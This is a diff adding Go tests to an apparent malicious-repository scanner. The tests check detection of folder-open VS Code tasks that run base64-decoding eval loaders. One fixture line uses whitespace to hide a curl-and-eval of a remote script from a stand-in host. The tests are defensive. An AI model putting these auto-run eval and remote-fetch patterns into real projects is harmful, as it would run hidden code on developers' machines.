@@ -1,11 +1,13 @@
 package scan
 
 import (
+	"context"
 	"encoding/base64"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/howardhsieh/preflight/internal/finding"
 )
@@ -32,7 +34,7 @@ func writeRepo(t *testing.T, files map[string]string) string {
 
 func mustScan(t *testing.T, root string, opt Options) *Result {
 	t.Helper()
-	res, err := Run(root, opt)
+	res, err := Run(context.Background(), root, opt)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -498,6 +500,84 @@ func TestScoreCapsRepeatedRules(t *testing.T) {
 	fs = append(fs, finding.Finding{RuleID: "PF201", Severity: finding.High})
 	if _, verdict := Score(fs); verdict != VerdictReview {
 		t.Errorf("one high finding must yield REVIEW, got %s", verdict)
+	}
+}
+
+// A payload that a folderOpen task executes must not be discounted for
+// sitting in dist/ (bundled) — the v0.2.0 content-discount fix.
+func TestTriggerExecutedFileNotDiscounted(t *testing.T) {
+	root := writeRepo(t, map[string]string{
+		".vscode/tasks.json": `{"version":"2.0.0","tasks":[{"label":"x","type":"shell","command":"node dist/loader.js","runOptions":{"runOn":"folderOpen"}}]}`,
+		"dist/loader.js":     "const run=(s)=>eval(Buffer.from(s,'base64').toString());run('" + inertPayload + "')\n",
+	})
+	res := mustScan(t, root, Options{})
+	if res.Verdict != VerdictDanger {
+		t.Errorf("bundled payload run by folderOpen task: verdict %s, want DANGER:\n%s", res.Verdict, dump(res))
+	}
+	if findRule(res, "PF001") == nil {
+		t.Errorf("expected a chain for dist/loader.js:\n%s", dump(res))
+	}
+	// Control: the same file with no trigger stays quiet (bundled discount applies).
+	quiet := writeRepo(t, map[string]string{"dist/loader.js": "const run=(s)=>eval(Buffer.from(s,'base64').toString());run('" + inertPayload + "')\n"})
+	if r := mustScan(t, quiet, Options{}); r.Verdict == VerdictDanger {
+		t.Errorf("untriggered bundled file should not be DANGER:\n%s", dump(r))
+	}
+}
+
+// Chain resolution must reach non-Node payloads (.py/.sh/.mjs …).
+func TestChainResolutionBeyondNode(t *testing.T) {
+	for _, tc := range []struct{ cmd, file, body string }{
+		{"python tools/run.py", "tools/run.py", "import base64\nexec(base64.b64decode('" + inertPayload + "'))\n"},
+		{"bash tools/go.sh", "tools/go.sh", "#!/bin/sh\necho ok" + strings.Repeat(" ", 200) + "eval \"$(curl -s http://example.invalid/stage.sh)\"\n"},
+		{"node tools/load.mjs", "tools/load.mjs", "const r=(s)=>eval(atob(s));r('" + inertPayload + "')\n"},
+	} {
+		root := writeRepo(t, map[string]string{
+			".vscode/tasks.json": `{"version":"2.0.0","tasks":[{"label":"x","type":"shell","command":"` + tc.cmd + `","runOptions":{"runOn":"folderOpen"}}]}`,
+			tc.file:              tc.body,
+		})
+		res := mustScan(t, root, Options{})
+		if findRule(res, "PF001") == nil {
+			t.Errorf("%q: no chain formed for %s:\n%s", tc.cmd, tc.file, dump(res))
+		}
+	}
+}
+
+// Guards the content-scan DoS: a large file full of eval() but with no network
+// call must finish quickly rather than running the network regex per line.
+func TestLargeEvalFileTerminates(t *testing.T) {
+	// 1 MB of dyn-eval lines with no network call. Before the fix this ran the
+	// network regex over a 3 KB window on every line (O(lines × regex)); the
+	// budget here is generous for the fixed O(n) path even under -race, but
+	// small for the quadratic one.
+	var b strings.Builder
+	for b.Len() < 1<<20 {
+		b.WriteString("eval(atob('QQ=='));\n")
+	}
+	root := writeRepo(t, map[string]string{"huge.js": b.String()})
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	res, err := Run(ctx, root, Options{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if res.Incomplete {
+		t.Fatal("scan of a 1 MB eval-only file did not finish in 60s — DoS guard regressed")
+	}
+	if findRule(res, "PF703") != nil {
+		t.Error("PF703 fired with no network call present")
+	}
+}
+
+func TestScanContextIncomplete(t *testing.T) {
+	root := writeRepo(t, map[string]string{"a.js": "console.log(1)\n"})
+	ctx, cancel := context.WithCancel(context.Background())
+	cancel() // already done before the scan starts
+	res, err := Run(ctx, root, Options{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !res.Incomplete {
+		t.Error("a cancelled context should mark the result Incomplete")
 	}
 }
 
